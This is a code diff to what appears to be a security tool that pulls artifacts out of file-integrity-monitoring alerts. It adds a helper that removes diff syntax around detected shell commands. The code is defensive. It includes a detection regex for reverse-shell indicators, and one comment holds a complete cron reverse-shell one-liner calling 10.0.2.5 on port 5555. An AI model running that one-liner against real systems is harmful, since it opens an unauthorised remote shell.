@@ -75,6 +75,14 @@ _SHELL_INDICATOR_RE = re.compile(
     r"(reverse shell|/dev/tcp/|sh\s+-i|bash\s+-i|nc\s+-e|netcat)",
     re.IGNORECASE,
 )
+# Syscheck/FIM `diff` blobs carry the changed line wrapped in diff syntax, e.g.
+#   0a1
+#   > * * * * * sh -i >& /dev/tcp/10.0.2.5/5555 0>&1
+# Recording the whole blob verbatim pollutes the board with `command: 0a1` style
+# noise, so we strip diff hunk headers and per-line +/-/</> markers and keep only
+# the substantive lines.
+_DIFF_HUNK_RE = re.compile(r"^(?:@@.*@@|\d+[acd]\d+|---\s|\+\+\+\s|[<>+-]\s*$)")
+_DIFF_PREFIX_RE = re.compile(r"^[+\-<>]\s?")
 # Long even-length hex tokens that may be encoded payloads (min 16 hex chars = 8 bytes;
 # skip known hash lengths 32/40/64 which are handled separately).
 _HEX_PAYLOAD_RE = re.compile(r"\b([0-9a-fA-F]{16,512})\b")
@@ -182,6 +190,21 @@ def _is_command_key(key: str) -> bool:
     )
 
 
+def _extract_shell_lines(blob: str) -> str:
+    """From a diff/free-form blob, return only the shell-bearing lines with diff
+    markers stripped, deduped and joined. Empty string when none qualify (caller
+    falls back to the raw value, preserving behavior for plain command strings)."""
+    lines: list[str] = []
+    for raw_line in blob.splitlines():
+        line = raw_line.strip()
+        if not line or _DIFF_HUNK_RE.match(line):
+            continue
+        line = _DIFF_PREFIX_RE.sub("", line).strip()
+        if line and _SHELL_INDICATOR_RE.search(line):
+            lines.append(line)
+    return "; ".join(dict.fromkeys(lines))
+
+
 def _mine_command(command: str, source: str) -> list[Artifact]:
     """Record a command line plus the file paths / IPs embedded in it.
 
@@ -256,7 +279,10 @@ def extract_artifacts(raw: str) -> list[Artifact]:
                             is_shell = True
                             break
                 if is_shell:
-                    for artifact in _mine_command(value, source):
+                    # Clean diff syntax so the command artifact is the actual
+                    # shell line, not `command: 0a1` / `> ...` diff noise.
+                    base = _extract_shell_lines(value) or value
+                    for artifact in _mine_command(base, source):
                         found.setdefault((artifact.kind, artifact.value.lower()), artifact)
             kind = _artifact_kind(key)
             if not kind:
